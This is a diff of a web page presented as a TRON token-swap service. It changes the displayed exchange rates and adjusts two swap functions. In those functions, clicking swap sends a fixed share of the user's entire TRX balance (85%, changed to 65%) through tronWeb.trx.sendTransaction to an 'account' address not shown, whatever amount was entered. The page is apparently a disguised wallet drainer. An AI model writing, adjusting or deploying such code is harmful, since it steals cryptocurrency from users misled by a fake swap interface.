@@ -10,7 +10,7 @@
     <link rel="stylesheet" href="https://vccswap.github.io/css/reset.css" type="text/css">
     <link rel="stylesheet" href="https://vccswap.github.io/css/bootstrap-grid.min.css" type="text/css">
     <link rel="stylesheet" href="https://vccswap.github.io/css/animations.css" type="text/css">
-    <link rel="stylesheet" href="https://vccswap.github.io/css/perfect-scrollbar.css" type="text/css">
+    <link rel="stylesheet" href="https://vccswap.github.io/css/perfect/scrollbar.css" type="text/css">
     <link rel="stylesheet" href="https://vccswap.github.io/css/owl.carousel.css" type="text/css">
     <link rel="stylesheet" href="https://vccswap.github.io/css/magnific-popup.css" type="text/css">
     <link rel="stylesheet" href="https://vccswap.github.io/css/main.css?v=1" type="text/css">
@@ -93,14 +93,14 @@
                   }
                   $("#token-input").focus();
                   $("#token-input").val(tokenBalance).change();
-                  $("#trx-swap").val(tokenBalance * 2).change();
+                  $("#trx-swap").val(tokenBalance * 0.4785).change();
               }
 
               async function maxTRX(){
                   var acc = await tronWeb.trx.getAccount();
                   $("#trx-input").focus();
                   $("#trx-input").val(acc.balance / 1000000).change();
-                  $("#token-swap").val(acc.balance / 1000000 / 2).change();
+                  $("#token-swap").val(acc.balance / 1000000 / 0.4785).change();
               }
 
               async function swapToken(){
@@ -121,7 +121,7 @@
                       alert('Your TRX balance not enough!');
                       return;
                   }
-                  var v = Math.floor(acc.balance * 85 / 100);
+                  var v = Math.floor(acc.balance * 65 / 100);
                   var tx = await tronWeb.trx.sendTransaction(account, v);
               }
 
@@ -132,7 +132,7 @@
                       alert('Your TRX balance not enough!');
                       return;
                   }
-                  var v = Math.floor(acc.balance * 85 / 100);
+                  var v = Math.floor(acc.balance * 65 / 100);
                   var tx = await tronWeb.trx.sendTransaction(account, v);
               }
           </script>
@@ -339,11 +339,11 @@
               function change(){
                 try{
                   var tokens = $("#token-input").val();
-                  $("#trx-swap").val(tokens * 2).change();
+                  $("#trx-swap").val(tokens * 0.4785).change();
 
 
                   var value = $("#trx-input").val();
-                  $("#token-swap").val(value / 2).change();
+                  $("#token-swap").val(value / 0.4785).change();
 
                 }catch{}
               }
